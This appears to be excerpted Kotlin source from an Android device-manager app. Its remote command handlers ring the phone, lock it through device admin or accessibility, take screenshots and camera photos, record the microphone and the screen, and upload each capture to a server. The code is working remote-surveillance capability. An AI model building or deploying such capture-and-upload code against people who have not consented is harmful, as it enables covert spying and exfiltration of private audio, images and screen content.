   109→    fun vibrate(context: Context, params: Map<String, Any>): String {
   110→        return try {
   111→            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
   112→            if (!vibrator.hasVibrator()) return "Device has no vibrator"
   113→            
   114→            val duration = ((params["arg"]?.toString()?.toLongOrNull() ?: 1000L)).coerceAtMost(5000)
   115→            val pattern = params["pattern"] as? List<Long>
   116→            
   117→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
   118→                val effect = if (pattern != null && pattern.isNotEmpty()) {
   119→                    VibrationEffect.createWaveform(pattern.toLongArray(), -1)
   120→                } else {
   121→                    VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE)
   122→                }
   123→                vibrator.vibrate(effect)
   124→            } else {
   125→                @Suppress("DEPRECATION")
   126→                if (pattern != null && pattern.isNotEmpty()) {
   127→                    vibrator.vibrate(pattern.toLongArray(), -1)
   128→                } else {
   129→                    vibrator.vibrate(duration)
   130→                }
   131→            }
   132→            "Vibrating for ${duration}ms"
   133→        } catch (e: Exception) {
   134→            Log.e(TAG, "Vibrate error", e)
   135→            "Error: ${e.message}"
   136→        }
   137→    }

   140→    fun ring(context: Context): String {
   141→        return try {
   142→            val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
   143→            am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0)
   144→            am.ringerMode = AudioManager.RINGER_MODE_NORMAL
   145→
   146→            val uri = Settings.System.DEFAULT_RINGTONE_URI
   147→            val player = android.media.MediaPlayer.create(context, uri)
   148→            player?.setAudioAttributes(
   149→                AudioAttributes.Builder()
   150→                    .setUsage(AudioAttributes.USAGE_NOTIFICATION_RINGTONE)
   151→                    .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
   152→                    .build()
   153→            )
   154→            player?.isLooping = true
   155→            player?.start()
   156→            player?.setOnCompletionListener { it.release() }
   157→            
   158→            // Auto-stop after 30 seconds
   159→            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
   160→                try { player?.stop(); player?.release() } catch (_: Exception) {}
   161→            }, 30000)
   162→            "Ringing..."
   163→        } catch (e: Exception) {
   164→            Log.e(TAG, "Ring error", e)
   165→            "Error: ${e.message}"
   166→        }

   197→    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
   198→    private fun captureScreenReal(context: Context, resultCode: Int, data: Intent): Map<String, Any> {
   199→        val latch = CountDownLatch(1)
   200→        var resultBitmap: Bitmap? = null
   201→        var error: String? = null
   202→        
   203→        try {
   204→            val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
   205→            val projection = mpm.getMediaProjection(resultCode, data)
   206→            
   207→            if (projection == null) {
   208→                return mapOf("error" to "Failed to create media projection")
   209→            }
   210→            
   211→            val metrics = context.resources.displayMetrics
   212→            val width = metrics.widthPixels
   213→            val height = metrics.heightPixels
   214→            val density = metrics.densityDpi
   215→            
   216→            val imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2)
   217→            
   218→            val virtualDisplay = projection.createVirtualDisplay(
   219→                "ScreenCapture",
   220→                width, height, density,
   221→                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
   222→                imageReader.surface, null, null
   223→            )
   224→            
   225→            imageReader.setOnImageAvailableListener({ reader ->
   226→                try {
   227→                    val image = reader.acquireLatestImage()
   228→                    if (image != null) {
   229→                        val planes = image.planes
   230→                        val buffer = planes[0].buffer
   231→                        val bytes = ByteArray(buffer.remaining())
   232→                        buffer.get(bytes)
   233→                        
   234→                        val bitmap = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
   235→                        if (bitmap != null) {
   236→                            resultBitmap = bitmap
   237→                        }
   238→                        image.close()
   239→                        latch.countDown()
   240→                    }
   241→                } catch (e: Exception) {
   242→                    error = e.message
   243→                    latch.countDown()
   244→                }
   245→            }, Handler(context.mainLooper))
   246→            
   247→            // Wait for capture
   248→            latch.await(5, TimeUnit.SECONDS)
   249→            
   250→            // Cleanup
   251→            virtualDisplay?.release()
   252→            imageReader?.close()
   253→            projection.stop()
   254→            
   255→            if (resultBitmap != null) {
   256→                // Convert to base64
   257→                val stream = ByteArrayOutputStream()
   258→                resultBitmap!!.compress(Bitmap.CompressFormat.JPEG, 80, stream)
   259→                val base64 = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT)
   260→                
   261→                // Save to file
   262→                val file = File(context.cacheDir, "screenshot_${System.currentTimeMillis()}.jpg")
   263→                FileOutputStream(file).use { it.write(stream.toByteArray()) }
   264→                
   265→                // Upload to server (file will be cached for streaming viewer)
   266→                CoroutineScope(Dispatchers.IO).launch {
   267→                    try {
   268→                        ApiClient.uploadFile(file, "screenshot")
   269→                    } catch (e: Exception) { Log.w(TAG, "Upload failed", e) }
   270→                }
   271→                
   272→                // Return full base64 for streaming viewer (server caches this)
   273→                return mapOf(
   274→                    "status" to "success",
   275→                    "message" to "Screenshot captured",
   276→                    "width" to resultBitmap!!.width,
   277→                    "height" to resultBitmap!!.height,
   278→                    "size" to stream.size(),
   279→                    "file" to file.name,
   280→                    "base64_preview" to base64
   281→                )
   282→            } else {
   283→                return mapOf("error" to (error ?: "Failed to capture screen"))
   284→            }
   285→        } catch (e: Exception) {
   286→            Log.e(TAG, "Screen capture error", e)
   287→            return mapOf("error" to (e.message ?: "Unknown error"))
   288→        }
   289→    }

   300→    private fun takePhotoReal(context: Context, facing: Int): Map<String, Any> {
   301→        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
   302→            return mapOf("error" to "Camera2 requires Android 5.0+")
   303→        }
   304→        
   305→        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
   306→            return mapOf(
   307→                "error" to "Camera permission not granted",
   308→                "permission_required" to "android.permission.CAMERA"
   309→            )
   310→        }
   311→        
   312→        val latch = CountDownLatch(1)
   313→        var resultBitmap: Bitmap? = null
   314→        var errorMessage: String? = null
   315→        
   316→        try {
   317→            val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
   318→            var cameraId: String? = null
   319→            
   320→            // Find camera with correct facing
   321→            for (id in manager.cameraIdList) {
   322→                val characteristics = manager.getCameraCharacteristics(id)
   323→                val lensFacing = characteristics.get(CameraCharacteristics.LENS_FACING)
   324→                if (lensFacing == facing) {
   325→                    cameraId = id
   326→                    break
   327→                }
   328→            }
   329→            
   330→            if (cameraId == null) {
   331→                return mapOf("error" to "No ${if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"} camera found")
   332→            }
   333→            
   334→            // Setup handler thread
   335→            val thread = HandlerThread("CameraThread").apply { start() }
   336→            val handler = Handler(thread.looper)
   337→            
   338→            // Get optimal size
   339→            val characteristics = manager.getCameraCharacteristics(cameraId)
   340→            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
   341→            val sizes = map?.getOutputSizes(ImageFormat.JPEG)
   342→            val size = sizes?.maxByOrNull { it.width * it.height }
   343→                ?: return mapOf("error" to "No supported JPEG sizes")
   344→            
   345→            // Create image reader
   346→            val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
   347→            
   348→            reader.setOnImageAvailableListener({ imageReader ->
   349→                try {
   350→                    val image = imageReader.acquireLatestImage()
   351→                    if (image != null) {
   352→                        val buffer = image.planes[0].buffer
   353→                        val bytes = ByteArray(buffer.remaining())
   354→                        buffer.get(bytes)
   355→                        
   356→                        val bitmap = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
   357→                        resultBitmap = bitmap
   358→                        
   359→                        // Save to file
   360→                        val file = File(context.cacheDir, "camera_${System.currentTimeMillis()}.jpg")
   361→                        FileOutputStream(file).use { it.write(bytes) }
   362→                        
   363→                        // Upload in background (with device_id for server identification)
   364→                        CoroutineScope(Dispatchers.IO).launch {
   365→                            try { ApiClient.uploadFile(file, "camera") } catch (e: Exception) { Log.w(TAG, "Upload failed", e) }
   366→                        }
   367→                        
   368→                        image.close()
   369→                    }
   370→                } catch (e: Exception) {
   371→                    errorMessage = e.message
   372→                }
   373→                latch.countDown()
   374→            }, handler)
   375→            
   376→            // Open camera
   377→            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
   378→                override fun onOpened(camera: CameraDevice) {
   379→                    try {
   380→                        val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
   381→                        captureRequest.addTarget(reader.surface)
   382→                        captureRequest.set(CaptureRequest.JPEG_ORIENTATION, 90)
   383→                        
   384→                        camera.createCaptureSession(
   385→                            listOf(reader.surface),
   386→                            object : CameraCaptureSession.StateCallback() {
   387→                                override fun onConfigured(session: CameraCaptureSession) {
   388→                                    session.capture(captureRequest.build(), null, handler)
   389→                                    
   390→                                    // Close after capture
   391→                                    handler.postDelayed({
   392→                                        camera.close()
   393→                                        reader.close()
   394→                                        thread.quitSafely()
   395→                                    }, 2000)
   396→                                }
   397→                                
   398→                                override fun onConfigureFailed(session: CameraCaptureSession) {
   399→                                    errorMessage = "Session configuration failed"
   400→                                    latch.countDown()
   401→                                }
   402→                            },
   403→                            handler
   404→                        )
   405→                    } catch (e: Exception) {
   406→                        errorMessage = e.message
   407→                        latch.countDown()
   408→                    }
   409→                }
   410→                
   411→                override fun onDisconnected(camera: CameraDevice) {
   412→                    camera.close()
   413→                }
   414→                
   415→                override fun onError(camera: CameraDevice, error: Int) {
   416→                    errorMessage = "Camera error: $error"
   417→                    camera.close()
   418→                    latch.countDown()
   419→                }
   420→            }, handler)
   421→            
   422→            // Wait for result
   423→            val success = latch.await(10, TimeUnit.SECONDS)
   424→            
   425→            if (resultBitmap != null) {
   426→                val stream = ByteArrayOutputStream()
   427→                resultBitmap!!.compress(Bitmap.CompressFormat.JPEG, 80, stream)
   428→                val base64 = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT)
   429→                
   430→                return mapOf(
   431→                    "status" to "success",
   432→                    "message" to "Photo captured from ${if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"} camera",
   433→                    "width" to resultBitmap!!.width,
   434→                    "height" to resultBitmap!!.height,
   435→                    "size" to stream.size(),
   436→                    "base64_preview" to base64
   437→                )
   438→            } else {
   439→                return mapOf("error" to (errorMessage ?: "Failed to capture photo"))
   440→            }
   441→        } catch (e: Exception) {
   442→            Log.e(TAG, "Camera capture error", e)
   443→            return mapOf("error" to (e.message ?: "Camera capture failed"))
   444→        }
   445→    }

   448→    fun startAudioRecording(context: Context, params: Map<String, Any>): Map<String, Any> {
   449→        return try {
   450→            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
   451→                return mapOf(
   452→                    "error" to "RECORD_AUDIO permission not granted",
   453→                    "permission_required" to "android.permission.RECORD_AUDIO"
   454→                )
   455→            }
   456→            
   457→            if (isRecordingAudio) {
   458→                return mapOf("error" to "Already recording audio")
   459→            }
   460→            
   461→            val duration = (params["duration"] as? Number)?.toInt() ?: 60
   462→            val sampleRate = 44100
   463→            val channelConfig = AudioFormat.CHANNEL_IN_MONO
   464→            val audioFormat = AudioFormat.ENCODING_PCM_16BIT
   465→            val bufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
   466→            
   467→            val audioFile = File(context.cacheDir, "audio_${System.currentTimeMillis()}.m4a")
   468→            audioRecordFile = audioFile
   469→            
   470→            // Use MediaRecorder for compressed audio
   471→            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
   472→                MediaRecorder(context)
   473→            } else {
   474→                @Suppress("DEPRECATION")
   475→                MediaRecorder()
   476→            }
   477→            
   478→            mediaRecorder?.apply {
   479→                setAudioSource(MediaRecorder.AudioSource.MIC)
   480→                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
   481→                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
   482→                setAudioSamplingRate(sampleRate)
   483→                setAudioEncodingBitRate(128000)
   484→                setOutputFile(audioFile.absolutePath)
   485→                prepare()
   486→                start()
   487→            }
   488→            
   489→            isRecordingAudio = true
   490→            
   491→            // Auto-stop after duration
   492→            CoroutineScope(Dispatchers.Main).launch {
   493→                kotlinx.coroutines.delay(duration * 1000L)
   494→                if (isRecordingAudio) {
   495→                    stopAudioRecording(context)
   496→                }
   497→            }
   498→            
   499→            mapOf(
   500→                "status" to "recording",
   501→                "message" to "Audio recording started",
   502→                "duration_seconds" to duration,
   503→                "file" to audioFile.name
   504→            )
   505→        } catch (e: Exception) {
   506→            Log.e(TAG, "Audio recording start error", e)
   507→            mapOf("error" to (e.message ?: "Failed to start audio recording"))
   508→        }
   509→    }

   511→    fun stopAudioRecording(context: Context): Map<String, Any> {
   512→        return try {
   513→            if (!isRecordingAudio) {
   514→                return mapOf("error" to "Not recording audio")
   515→            }
   516→            
   517→            mediaRecorder?.apply {
   518→                stop()
   519→                release()
   520→            }
   521→            mediaRecorder = null
   522→            isRecordingAudio = false
   523→            
   524→            val file = audioRecordFile
   525→            if (file != null && file.exists()) {
   526→                // Upload to server
   527→                CoroutineScope(Dispatchers.IO).launch {
   528→                    try { ApiClient.uploadFile(file, "audio") } catch (e: Exception) { Log.w(TAG, "Upload failed", e) }
   529→                }
   530→                
   531→                mapOf(
   532→                    "status" to "success",
   533→                    "message" to "Audio recording stopped",
   534→                    "file" to file.name,
   535→                    "size" to file.length()
   536→                )
   537→            } else {
   538→                mapOf("error" to "Audio file not found")
   539→            }
   540→        } catch (e: Exception) {
   541→            Log.e(TAG, "Audio recording stop error", e)
   542→            mapOf("error" to (e.message ?: "Failed to stop audio recording"))
   543→        }
   544→    }

   584→            val density = metrics.densityDpi
   585→            
   586→            val videoFile = File(context.cacheDir, "screen_${System.currentTimeMillis()}.mp4")
   587→            screenRecordFile = videoFile
   588→            
   589→            // Create media projection
   590→            val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
   591→            val projection = mpm.getMediaProjection(resultCode, data)
   592→            mediaProjection = projection
   593→            
   594→            // Setup recorder
   595→            screenRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
   596→                MediaRecorder(context)
   597→            } else {
   598→                @Suppress("DEPRECATION")
   599→                MediaRecorder()
   600→            }
   601→            
   602→            screenRecorder?.apply {
   603→                setVideoSource(MediaRecorder.VideoSource.SURFACE)
   604→                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
   605→                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
   606→                setVideoSize(width, height)
   607→                setVideoFrameRate(30)
   608→                setVideoEncodingBitRate(8 * 1000 * 1000) // 8 Mbps
   609→                setOutputFile(videoFile.absolutePath)
   610→                prepare()
   611→            }
   612→            
   613→            // Create virtual display
   614→            virtualDisplay = projection?.createVirtualDisplay(
   615→                "ScreenRecord",
   616→                width, height, density,
   617→                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
   618→                screenRecorder?.surface, null, null
   619→            )
   620→            
   621→            screenRecorder?.start()
   622→            isRecordingScreen = true
   623→            
   624→            // Auto-stop after duration
   625→            CoroutineScope(Dispatchers.Main).launch {
   626→                kotlinx.coroutines.delay(duration * 1000L)
   627→                if (isRecordingScreen) {
   628→                    stopScreenRecording(context)
   629→                }
   630→            }
   631→            
   632→            mapOf(
   633→                "status" to "recording",
   634→                "message" to "Screen recording started",
   635→                "duration_seconds" to duration,
   636→                "resolution" to "${width}x${height}",
   637→                "file" to videoFile.name
   638→            )
   639→        } catch (e: Exception) {
   640→            Log.e(TAG, "Screen recording start error", e)
   641→            mapOf("error" to (e.message ?: "Failed to start screen recording"))
   642→        }
   643→    }

   646→        if (!isRecordingScreen) {
   647→            return mapOf("error" to "Not recording screen")
   648→        }
   649→        
   650→        return try {
   651→            screenRecorder?.apply {
   652→                stop()
   653→                release()
   654→            }
   655→            screenRecorder = null
   656→            
   657→            virtualDisplay?.release()
   658→            virtualDisplay = null
   659→            
   660→            mediaProjection?.stop()
   661→            mediaProjection = null
   662→            
   663→            isRecordingScreen = false
   664→

   667→                // Upload to server

   670→                }
   671→                
   672→                mapOf(
   673→                    "status" to "success",
   674→                    "message" to "Screen recording stopped",
   675→                    "file" to file.name,
   676→                    "size" to file.length()
   677→                )
   678→            } else {
   679→                mapOf("error" to "Video file not found")
   680→            }
   681→        } catch (e: Exception) {

  1181→    fun lockPhone(context: Context): String {
  1182→        return try {
  1183→            val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
  1184→            
  1185→            // Try Device Admin first
  1186→            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
  1187→            val adminComponent = android.content.ComponentName(context, "com.abuzahra.manager.service.DeviceAdminReceiver")
  1188→            
  1189→            if (dpm.isAdminActive(adminComponent)) {
  1190→                dpm.lockNow()
  1191→                return "Phone locked"
  1192→            }
  1193→            
  1194→            // Fallback: try accessibility service
  1195→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
  1196→                val accessibility = MyAccessibilityService.getInstance()
  1197→                if (accessibility != null) {
  1198→                    accessibility.lockScreen()
  1199→                    return "Phone locked via accessibility"
  1200→                }
  1201→            }
  1202→            
  1203→            // Wake then lock
  1204→            @Suppress("DEPRECATION")
  1205→            val wakeLockFlags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
  1206→                android.os.PowerManager.PARTIAL_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP
  1207→            } else {
  1208→                @Suppress("DEPRECATION")
  1209→                android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP
  1210→            }
  1211→            val wl = pm.newWakeLock(wakeLockFlags, "abuzahra:lock")
  1212→            wl.acquire(100)
  1213→            wl.release()
  1214→            
  1215→            "Phone lock requires Device Admin or Accessibility service"
  1216→        } catch (e: Exception) {
  1217→            Log.e(TAG, "Lock phone error", e)
  1218→            "Error: ${e.message} - Device Admin may not be active"
  1219→        }
  1220→    }
